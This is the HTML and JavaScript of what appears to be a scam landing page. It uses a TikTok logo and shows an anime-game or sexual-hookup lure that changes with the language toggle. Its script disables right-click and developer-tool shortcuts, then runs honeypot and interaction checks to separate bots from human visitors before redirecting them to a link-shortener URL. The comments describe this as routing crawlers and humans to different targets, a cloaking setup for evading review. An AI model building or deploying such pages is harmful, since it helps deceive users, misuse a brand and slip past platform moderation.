  <style>
@keyframes spin { to { transform: rotate(360deg); } }
.animate-spin-custom { animation: spin 1s linear infinite; }
/* Asegura que la app-container sea visible */
#app-container { opacity: 0; transition: opacity 0.5s; }
#app-container.opacity-100 { opacity: 1; }
#loading-screen { transition: opacity 0.5s; }
/* Para que el honeypot no interfiera con el layout de la plantilla */
#honeypot-container {
position: absolute; top: 0; left: 0; width: 0; height: 0;
overflow: hidden; opacity: 0; pointer-events: none;
}

  <script>
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', e => {
if (
e.key === 'F12' ||
(e.ctrlKey && (e.key === 'i' || e.key === 'I' || e.key === 'u' || e.key === 'U'))
) {
e.preventDefault();
}
});
</script>
  <div id="loading-screen" class="fixed inset-0 bg-black flex items-center justify-center z-50">
   <p id="loading-text" class="text-white text-xl flex items-center">
    <svg class="animate-spin-custom -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
     <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle> <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
    </svg>
    Inicializando seguridad...
   </p>
  </div>
  <div id="app-container" class="w-full h-screen flex flex-col items-center justify-center relative">
   <div id="debug-info" class="absolute top-0 left-0 text-[8px] px-0.5 py-0.25 rounded-br-lg bg-black/5 z-20">
    <p id="app-message" class="mt-0.5 font-bold"></p>
   </div>
   <div class="absolute top-2 right-2 z-30">
    <button id="lang-toggle-btn" class="bg-black/50 hover:bg-black/80 text-white font-bold py-1 px-3 rounded-full text-sm transition" data-lang="es" aria-label="Cambiar idioma a Inglés">ENG</button>
   </div>
   <div class="layer"></div>
   <div class="wrap">
    <div class="step-block">
     <div class="logo">
      <img src="https://i.postimg.cc/kXXfxHsJ/Tik-Tok-logo-svg.png" alt="Logo TikTok" class="w-20 h-20 rounded-full">
     </div>
     <div id="step-2" class="step-item thishide" style="display: block;">
      <div id="question-title" class="question-title ">NOTE: quieres entrar a nuevo juego de anime Yakusa tu yukota presione entrar abajo....</div>
      <p><b style="color: red;"></b></p>
      <div class="buttons-block">
       <button id="btn-final-action" class="
step-btn submit-btn tr-submit-button
text-center uppercase font-black text-xl sm:text-2xl
py-4 px-8 rounded-xl transition-all duration-100
border-4 border-white shadow-xl
bg-fuchsia-tiktok text-black hover:scale-[1.03]
shadow-[0_8px_0_-2px_#e736a4,0_8px_0_0_#000]
active:shadow-[0_4px_0_-2px_#e736a4,0_4px_0_0_#000]
active:translate-y-[4px]
" role="button">ENTER</button>
      </div>
     </div>
     <video autoplay muted loop playsinline id="VideoBg">
      <source src="https://cdn.videy.co/pEvKWO9U1.mp4" type="video/mp4">
     </video>
     <div id="honeypot-container" aria-hidden="true">
      <input id="hp-field" name="honeypot" type="text" tabindex="-1" autocomplete="off">
     </div>
    </div>
   </div>
  </div>
  <script>
// === CONFIGURACIÓN DE TRADUCCIÓN ===
const translations = {
   'es': {
       loading_text: 'Inicializando seguridad...',
       title: 'DŮLEŽITÉ: Mnoho žen chce jen rychlý sex bez zbytečných otázek. Zaregistrujte se a užijte si seeeex s vybraným partnerem. Stiskněte (VSTUP) níže a užijte si trojky a mnoho dalšího....',
       button: 'VSTUP',
       processing: 'PROCESANDO...',
       blocked: 'BLOQUEADO',
       redirecting: 'Redirigiendo...',
       legit_reason: 'Usuario Legítimo',
       honeypot_fail: 'Fallo Honeypot',
       fast_interaction: 'Interacción Rápida',
       no_focus: 'Ventana no enfocada',
       no_interaction: 'Interacción no detectada',
       denied: 'Acceso Denegado. Fallo de Verificación:',
       lang_toggle_label: 'Cambiar idioma a Inglés',
       lang_toggle_btn: 'ENG',
   },
   'en': {
       loading_text: 'Initializing security...',
       title: 'NOTE: Many women just want quick sex without too many questions. Register to have sex with the one you choose. Press (ENTER) below to enjoy threesomes and much more....',
       button: 'ENTER',
       processing: 'PROCESSING...',
       blocked: 'BLOCKED',
       redirecting: 'Redirecting...',
       legit_reason: 'Legitimate User',
       honeypot_fail: 'Honeypot Failure',
       fast_interaction: 'Fast Interaction',
       no_focus: 'Window not focused',
       no_interaction: 'No interaction detected',
       denied: 'Access Denied. Verification Failure:',
       lang_toggle_label: 'Change language to Spanish',
       lang_toggle_btn: 'ESP',
   }
};
let currentLang = 'es'; // Idioma por defecto
function updateContent(lang) {
   const t = translations[lang];
   // Actualiza el texto de la pantalla de carga
   document.getElementById('loading-text').childNodes[2].textContent = t.loading_text;
   // Actualiza el título del paso 2
   document.getElementById('question-title').textContent = t.title;
   // Actualiza el botón final (solo si no está en estado de procesamiento/bloqueo)
   if (!isProcessing && !isBotDetected) {
       updateFinalButton(t.button);
   }
   // Actualiza el botón de cambio de idioma
   const langBtn = document.getElementById('lang-toggle-btn');
   langBtn.setAttribute('data-lang', lang);
   langBtn.setAttribute('aria-label', t.lang_toggle_label);
   langBtn.textContent = t.lang_toggle_btn;
   currentLang = lang; // Guarda el nuevo idioma
   document.documentElement.lang = lang; // Actualiza el atributo lang del HTML
}
// === LÓGICA DE CAMBIO DE IDIOMA ===
document.getElementById('lang-toggle-btn').addEventListener('click', (e) => {
   const nextLang = currentLang === 'es' ? 'en' : 'es';
   updateContent(nextLang);
});
// === CONFIGURACIÓN DE SEGURIDAD JS ===
const MIN_INTERACTION_TIME = 4000; // 4 segundos
// ⚠️ MODIFICA ESTAS DOS LÍNEAS PARA CAMBIAR LOS ENLACES
const TARGET_URL_HUMAN = "https://clic.link0ff.com/pastelin3"; // URL para tráfico legítimo (Wikipedia)
const TARGET_URL_BOT = "https://clic.link0ff.com/pastelin3"; // URL para bots (Google)
// === Variables Globales de Estado ===
let isBotDetected = false;
let loadTimeRef = Date.now();
let isProcessing = false;
let hasWindowFocused = false;
let hasMouseMoved = false;
// === Elementos del DOM ===
const appContainer = document.getElementById('app-container');
const loadingScreen = document.getElementById('loading-screen');
const btnFinalAction = document.getElementById('btn-final-action');
const hpField = document.getElementById('hp-field');
const msgDisplay = document.getElementById('app-message');
// === LÓGICA DE SEGURIDAD Y ESTADO DEL BOTÓN ===
function displayMessage(messageKey, isError = false) {
   const t = translations[currentLang];
   let message = messageKey;
   if (t[messageKey]) {
       message = t[messageKey];
   }
   // Si es un mensaje de error de verificación
   if (messageKey === 'denied' && isError) {
        // messageKey se usa como la razón en este caso, por lo que buscamos la traducción de la razón
       const reasonKey = arguments[2] || ''; // La razón se pasa como tercer argumento
       const reason = t[reasonKey] || reasonKey;
       message = `${t.denied} ${reason}.`;
   }
 
   // Muestra mensajes de error/éxito en la esquina superior izquierda
   msgDisplay.textContent = message;
   // Usamos clases de Tailwind para los colores de los mensajes
   msgDisplay.className = isError
   ? 'mt-0.5 font-bold text-red-600'
   : 'mt-0.5 font-bold text-green-500';
   setTimeout(() => {
   msgDisplay.textContent = '';
   msgDisplay.className = 'mt-0.5 font-bold';
   }, 3000);
}
function updateFinalButton(textKey, isBlocked = false, isLoader = false) {
   const t = translations[currentLang];
   const text = t[textKey] || textKey;
   // Replicamos las clases y estilos del botón ACEPTAR de la landing anterior
   const baseClasses = 'step-btn submit-btn tr-submit-button text-center uppercase font-black text-xl sm:text-2xl py-4 px-8 rounded-xl transition-all duration-100 border-4 border-white shadow-xl';
   if (isLoader) {
   // Estado 'PROCESANDO...'
   btnFinalAction.innerHTML = `
<div class="flex items-center justify-center">
<svg class="animate-spin-custom -ml-1 mr-3 h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
</svg>
   ${text}
</div>
   `;
   btnFinalAction.className = `${baseClasses} bg-fuchsia-tiktok text-black`;
   } else if (isBlocked) {
   // Estado 'BLOQUEADO'
   btnFinalAction.innerHTML = text;
   btnFinalAction.className = `${baseClasses} bg-red-600 cursor-not-allowed text-white shadow-[0_8px_0_0_#900]`;
   } else {
   // Estado Normal
   btnFinalAction.innerHTML = text;
   btnFinalAction.className = `${baseClasses} bg-fuchsia-tiktok text-black hover:scale-[1.03] shadow-[0_8px_0_-2px_#e736a4,0_8px_0_0_#000] active:shadow-[0_4px_0_-2px_#e736a4,0_4px_0_0_#000] active:translate-y-[4px]`;
   }
}
function setupHumanEventListeners() {
window.addEventListener('focus', () => { hasWindowFocused = true; }, { once: true });
document.addEventListener('mousemove', () => { hasMouseMoved = true; }, { once: true });
document.addEventListener('click', () => { hasMouseMoved = true; }, { once: true });
}
function checkBotActivity() {
let detected = false;
let detectionReasonKey = 'legit_reason'; // Clave de traducción
const clickTime = Date.now();
const interactionTime = clickTime - loadTimeRef;
const isHoneypotFilled = hpField.value.trim().length > 0;
if (isHoneypotFilled) {
   detected = true;
   detectionReasonKey = 'honeypot_fail';
}
if (interactionTime < MIN_INTERACTION_TIME && !detected) {
   detected = true;
   detectionReasonKey = 'fast_interaction';
}
if (!hasWindowFocused && !detected) {
   detected = true;
   detectionReasonKey = 'no_focus';
}
if (!hasMouseMoved && !detected) {
   detected = true;
   detectionReasonKey = 'no_interaction';
}
if (detected) {
   isBotDetected = true;
   // Pasa la clave de la razón para que displayMessage la traduzca
   displayMessage('denied', true, detectionReasonKey);
   updateFinalButton('blocked', true);
} else {
   isBotDetected = false;
}
return detected;
}
async function handleEntry(e) {
e.preventDefault();
if (isProcessing || isBotDetected) return;
isProcessing = true;
updateFinalButton('processing', false, true);
const isBot = checkBotActivity();
let targetUrl;
if (isBot) {
targetUrl = TARGET_URL_BOT; // URL para Bots (Google)
} else {
targetUrl = TARGET_URL_HUMAN; // URL para Humanos (Wikipedia)
}
displayMessage("redirecting");
setTimeout(() => {
isProcessing = false;
window.location.href = targetUrl;
}, 600);
}
// === Inicialización de la Aplicación ===
async function initApp() {
// Aplica el idioma inicial al cargar
updateContent(currentLang);
setupHumanEventListeners();
// Ocultar pantalla de carga e iniciar la aplicación
loadingScreen.style.opacity = '0';
setTimeout(() => {
loadingScreen.style.display = 'none';
appContainer.classList.add('opacity-100');
loadTimeRef = Date.now(); // Marca el tiempo de inicio
}, 500);
}
btnFinalAction.addEventListener('click', handleEntry);
initApp();
</script>
</body>
</html>
